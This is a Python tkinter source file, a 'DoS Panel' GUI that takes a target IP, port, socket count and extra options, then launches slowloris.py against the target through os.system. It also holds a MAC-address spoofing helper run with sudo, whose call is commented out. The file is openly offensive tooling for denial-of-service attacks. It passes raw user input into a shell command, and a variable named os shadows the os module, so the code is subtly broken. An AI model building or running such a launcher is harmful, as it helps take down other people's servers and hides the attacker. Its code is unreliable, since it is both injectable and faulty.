from tkinter import *
from tkinter.ttk import *
import os as os
import platform

command = "slowloris.py"

# creates a Tk() object
master = Tk()
# root window
master.geometry("300x400")
master.title("Dos Pannel | by aziv1")

def randomise_mac_linux():
    os.system('sudo python randomise_mac_linux.py wlan0 -r')

#STARTING SLOWLORIS
def startSlowloris():
    os = platform.system()

    global command

    #IP TARGET CONFIG
    inp_IP = inputtxt1.get(1.0, "end-1c")
    command = command + " " + inp_IP

    #PORT CONFIG
    inp_P = inputtxt2.get(1.0, "end-1c")
    if inp_P == "":
        command = command
    else:
        command = command + " -p " + inp_P

    #SOCKET COUNT CONFIG
    inp_SOCK = inputtxt3.get(1.0, "end-1c")
    if inp_SOCK == "":
        command = command
    else:
        command = command + " -s " + inp_SOCK
    
    #EXTRA OPTIONS
    inp_EXTRA = inputtxt4.get(1.0, "end-1c")
    if inp_EXTRA == "":
        command = command
    else:
        command = command + " " + inp_EXTRA
    
    
    
    ################################################################
    # SPOOFERS AND MORE

    #if os == "Linux":
    #   randomise_mac_linux()
    



    os.system('python ' + command)

def helpSlowloris():
    os.system('python slowloris.py --help')

label = Label(master, text ="DoS Panel | By aziv1")
label.pack(pady = 10)
 
# a button widget which will open a
# new window on button click
#btn = Button(master, text ="Open New Window", command = openNewWindow)
#btn.pack(pady = 10)

#Start Slowloris Button, For Testing
btn2 = Button(master, text ="Excecute", command = startSlowloris)
btn2.pack(pady = 10)

#GET SLOWLORIS HELP
btn3 = Button(master, text ="Slowloris Help", command = helpSlowloris)
btn3.pack(pady = 10)

text = Label(master, text="IP TO ATTACK")
text.pack(pady=10)

# TextBox For IP
inputtxt1 = Text(master, height = 1, width = 20)
inputtxt1.pack()

text = Label(master, text="PORT TO ATTACK")
text.pack(pady=10)

# TextBox For Port
inputtxt2 = Text(master, height = 1, width = 20)
inputtxt2.pack()

text = Label(master, text="AMOUNT OF SOCKETS")
text.pack(pady=10)

# TextBox For Port
inputtxt3 = Text(master, height = 1, width = 20)
inputtxt3.pack()

text = Label(master, text="EXTRA OPTIONS")
text.pack(pady=10)

# TextBox For Port
inputtxt4 = Text(master, height = 1, width = 20)
inputtxt4.pack()

# mainloop, runs infinitely
mainloop()